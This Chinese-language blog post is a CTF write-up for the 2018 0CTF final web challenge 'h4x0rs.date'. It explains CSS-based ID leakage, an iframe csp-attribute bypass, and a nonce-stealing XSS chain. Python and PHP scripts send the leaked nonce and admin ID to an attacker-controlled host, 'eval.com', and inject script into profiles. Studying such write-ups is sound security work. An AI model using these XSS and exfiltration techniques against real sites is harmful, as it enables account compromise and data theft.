---
title: 2018 0CTF final h4x0rs.date
author: 5am3
comment: true
date: 2018-06-03 17:26:42
tags:
	- xss
	- nonce绕过
	- 0ctf
	- csp
categories:
	- web
---



当时比赛时，差一点就解出来了。结束前半小时，才发觉获取nonce的漏洞点。

还是太菜了，否则能一跃第四。

这题其实挺有意思的， 赛后仔细想想，好像也不是太难。但是题目真心不错。

最后证实，这题有多种解法，但每一种解法，都感觉学到了很多。

题目链接：https://h4x0rs.date/

<!-- more -->

由于这篇题解自己拖得时间有点长了，所以刚刚发现 lorexxar大佬的题解写的很棒了，大家可以看一下，我就不过多介绍题目了。而且我尽量写一些与他不同的。

https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data



## 获取ID

我们是通过一个比较简单的方式获取到的id。题目中存在一个id为msg标签可写内容。此时我们将自己资料改为

```html
<style id=msg></style>
```

然后构造链接report即可

```html
http://h4x0rs.date/login.php?redict=profile.php?id={you_id}%26msg=body{background-img:url('//eval.com?id=
```



## 【非预期】通过iframe控制csp

这个解法是刷出题人Twitter刷到的。

![mark](http://img.5am3.com/img/180531/HdEkFhl6GE.png)

### 原理

因为题目本身是通过加载js，来实现csp的加载。此时csp是直接写到内容中的。可以影响到此标签后面的js的加载。（前面的无法影响）

所以，此时我们只要能提前想办法不让这个js加载即可。当时自己也是想过的，然而......没办法。

在这里，这位大佬用了iframe标签的csp属性。（貌似只有chrome可以用）



### 利用

此时我们先构造user1的资料为

```html
<script>alert(1);</script>
```

然后再构造user2的资料为如下，从而加载恶意代码

```html
<iframe src=/profile.php?id=user1_ID csp="script-src 'unsafe-inline';">
```

此时，当我们访问user2资料时，便成功触发漏洞。





## 【预期】拿到nonce，执行js

https://paper.seebug.org/166/#a-csscspdom-xss-three-way

之前自己一直想的是通过style来拿nonce，因为他有缓存。而且时间还可以。最后自己努力将时间控制在15s左右。但是发过去后发现，那边没有回显？自己chrome是66，bot是65。当时很迷，还问出题人来着。但出题人没有对这块进行答复，而是反问我，时间问题。并且说明bot只停留15s，你这样是不行的。

所以只好换思路。当时不知道脑子那根筋抽了，没想到自己加载他的js。最后比赛结束前半小时才发现这个问题。

然而因为需要一系列自动化脚本的编写。最终也没来得及写完。比赛结束后才勉强写出beta版本。



### 思路

此时因为缓存的原因，20s的缓存。也就是说，当前页面的静态文件时不会重新加载的。那么，我们在当前页面加载一个iframe，即**eval.php**，去加载js从而获取nonce。但是获取nonce需要传入id。

因为此时我们已经成功关注了admin，所以可以通过python在自己页面爬取到admin的id。

此时大概逻辑便有了。



1.获取到管理员id，并且传给服务器，保存到a.txt。

2.将user1的资料改为将eval.php作为iframe加载。eval.php会引入a.txt的id。

3.此时eval.php 成功拿到nonce，保存到b.txt。并且在5秒后加载user2的资料

4.紧接着，修改user2 的资料，写入evaljs，并且将b.txt中的nonce带上。

5.此时，一套流程便完成了。等待evaljs的执行即可。



### 脚本

大概用了以下几个脚本。写完没来得及做测试环境就关了。最近虽然环境一直开着，但是有些事给耽误复现了。

也就是说.....至今还未复现。



**poc.py**

```python
import re
import requests
import time

# 获取管理员id
def getAdminid():
    return re.search("id=([0-9a-zA-Z]*)\">admin2<" , requests.get("https://h4x0rs.date/profile.php" , cookies={"PHPSESSID":"p28vu9m2h0uj7g04m73uo4fsm6"}).text).group(1)

# 从服务器端a.txt获取nonce
def getNonce():
	return requests.get("http://eval.com/a.txt").text

# 修改资料页内容
def reProfile(ec):
	url="https://h4x0rs.date/profile.php"
	cookie=
	headers={
		"Cookie":"PHPSESSID=8fut6nfo8f449hu3t6ft2qp3s3",
	}

	data={
		"intro":ec,
		"submit":"submit",
	}

	print(ec)
	r=requests.post(url,data=data,headers=headers)

# 发送report
def sendReport():
	codeurl="https://h4x0rs.date/profile.php?id=428222d40f05cfc8f1a1f2b550b29952db37d2016899a9f2e0534f630739c1e4"
	requests.post("https://h4x0rs.date/do_report.php",data={"url": codeurl,"submit": "submit"} , cookies={"PHPSESSID":"p28vu9m2h0uj7g04m73uo4fsm6"})
	print("send url ok!")


# 修改user2资料页中的nonce
def changeNonce(nonce):
	evalcode="<script src=//eval.com/eval.js nonce='"+nonce+"''></script>"
	reProfile(evalcode)


# 首先获取到admin的id，并保存到b.txt
id = getAdminid()
requests.get("http://eval.com/save_b.php?b="+id)

#发送report，从而加载eval.php
sendReport()

# 获取nonce，并修改内容。
while(1):
	nonce=getNonce()
	if(nonce !=''):
		changeNonce(nonce)
	time.sleep(0.5)

```



**eval.php**

```php+HTML
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>eval</title>
	<script src="https://h4x0rs.date/assets/jquery-3.3.1.min.js"></script>
	<script>
         // 加载user2的资料页
		function aa(){
			var iframe = document.createElement('iframe'); 
			iframe.src="https://h4x0rs.date/profile.php?id=1d70f9cca4ab0d188c0cc9524b0d92705607d9b0d2e3923841e8b194ac7601cc";  
			document.body.appendChild(iframe);
		}
        
         
		$(document).ready( function () {
		  //获取nonce
           var m = $("meta[http-equiv=Content-Security-Policy]");
		  var nonce=m.attr("content");

		  // 通过savea.php将nonce保存为a.txt
           var url="https://eval.com/save_a.php?a=";
		  var n0t = document.createElement("link");
		  n0t.setAttribute("rel", "prefetch");
		  n0t.setAttribute("href", url+nonce);
		  document.head.appendChild(n0t);
           
           //每3秒重新加载一次user2的资料
		  setInterval("aa()", 3000 )
		});
	</script>
    
    
	<script type="text/javascript" src="https://h4x0rs.date/assets/csp.js?id=<?php echo file_get_contents('b.txt');?>&page=profile.php"></script>

</head>
<body>
</body>
</html>

```



**save_a.php**

```php
<?php
function save($str){
    $myfile = fopen("./a.txt", "w");
    fwrite($myfile, $str);
    fclose($myfile);
}
save($_GET['a']);
```

**save_b.php**

```php
<?php
function save($str){
    $myfile = fopen("./b.txt", "w");
    fwrite($myfile, $str);
    fclose($myfile);
}
save($_GET['b']);
```



## 最后

这道题蛮棒的，话说l4wio大佬总是一次又一次刷新自己对xss的认识。最近0ctf，学到了很多套路。再一次感觉到xss的乐趣。想尽一切办法去bypass。但是切记不能忽视任何一个微小的细节。或许哪里就会是一个漏洞。

看过标答后，发现l4wio大佬的答案更有意思一点，在这里，我用了两个用户，而大佬，直接通过csrf修改admin资料，将admin作为第二个用户来构造xss。膜一下。





## 参考资料

- https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data
- https://github.com/l4wio/CTF-challenges-by-me/blob/master/0ctf_final-2018/0ctf_tctf_2018_slides.pdf
